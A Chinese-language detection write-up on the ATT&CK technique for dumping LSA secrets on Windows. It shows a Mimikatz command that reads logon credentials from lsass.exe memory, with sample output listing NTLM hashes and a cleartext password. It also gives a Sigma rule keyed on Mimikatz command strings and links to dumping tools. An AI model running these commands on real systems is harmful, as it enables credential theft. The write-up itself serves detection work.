# T1003-004-windows-基于LSA凭证获取

## 来自ATT&CK的描述

具有SYSTEM访问主机权限的攻击者可能会尝试访问本地安全机构（LSA）机密，其中可能包含各种不同的凭据材料，例如服务帐户的凭据。LSA机密存储在注册表中HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets。LSA机密也可以从内存中转储。

Reg可用于从注册表中提取。Mimikatz可用于从内存中提取秘密。

### LSA（Local Security Authority）

通过system权限访问主机lsass.exe进程，可以从中读取本地登录和域登录的明文密码。当服务在本地或域用户的上下文中运行时，其密码存储在注册表中。如果启用了自动登录，则此信息也将存储在注册表中。

本地安全机构子系统服务（LSASS）处理Windows主机中安全策略的实施。在从2000到Server 2008的Windows环境中，LSASS进程的内存以明文形式存储密码以支持WDigest和SSP身份验证。因此，Mimikatz等工具可以轻松检索密码。自Windows 8.1和Windows Server 2012的Microsoft为了增强系统的安全性，进一步阻止了LSASS以明文形式存储密码。

## 测试案例

你可以使用许多工具进行检索读取SAM文件：

- pwdump.exe
- Mimikatz
- gsecdump
- ······

或者，可以使用reg.exe从注册表中提取文件，并使用Creddump7收集凭据。

注意：由机制问题提取的密码是UTF-16编码的，这意味着它们以明文形式返回.Windows 10增加了对缓解中描述的LSA秘密的保护

## 检测日志

sysmon日志

windows security日志

## 测试复现

### 攻击方法：从lsass.exe程序内存中读取密码(administrator)

```dos
C:\mimikatz_trunk\x64>mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 246475 (00000000:0003c2cb)
Session           : RemoteInteractive from 2
User Name         : 1.205
Domain            : 1205-PC
Logon Server      : 1205-PC
Logon Time        : 2019/7/10 16:12:02
SID               : S-1-5-21-4083414316-2806399370-2225847366-1000
        msv :
         [00000003] Primary
         * Username : 1.205
         * Domain   : 1205-PC
         * LM       : 6ce1432e9b83da8da8eed815a197bd87
         * NTLM     : 6136ba14352c8a09405bb14912797793
         * SHA1     : b1ab7381d8e9799e407f1d4cb39e33b5d3e54f72
        tspkg :
         * Username : 1.205
         * Domain   : 1205-PC
         * Password : 1qazcde3!@#
        wdigest :
         * Username : 1.205
         * Domain   : 1205-PC
         * Password : 1qazcde3!@#
        kerberos :
         * Username : 1.205
         * Domain   : 1205-PC
         * Password : 1qazcde3!@
        ssp :
        credman :
```

## 测试留痕

暂无

## 检测规则/思路

### sigma规则

```yml
title: Mimikatz使用
description: 检测常见的mimikatz命令参数
tags:
    - attack.s0002
    - attack.t1003
    - attack.lateral_movement
    - attack.credential_access
logsource:
    product: windows
detection:
    keywords:
        Message:
        - "* mimikatz *"
        - "* mimilib *"
        - "* <3 eo.oe *"
        - "* eo.oe.kiwi *"
        - "* privilege::debug *"
        - "* sekurlsa::logonpasswords *"
        - "* lsadump::sam *"
        - "* mimidrv.sys *"
        - "* p::d *"
        - "* s::l *"
    condition: keywords
falsepositives:
    - Naughty administrators
    - Penetration test
level: critical
```

### 建议

对数据源要求较高，可适用范围为：2012及以上操作系统，需要开启审核策略；部署sysmon的Windows操作系统，进程创建日志。

## 参考推荐

MITRE-ATT&CK-T1003-004

<https://attack.mitre.org/techniques/T1003/004>

pwdump7

<http://passwords.openwall.net/b/pwdump/pwdump7.zip>

powershell

<https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1>

mimikatz wiki

<https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump>

关于更多转储明文密码你可以参考

<https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/>
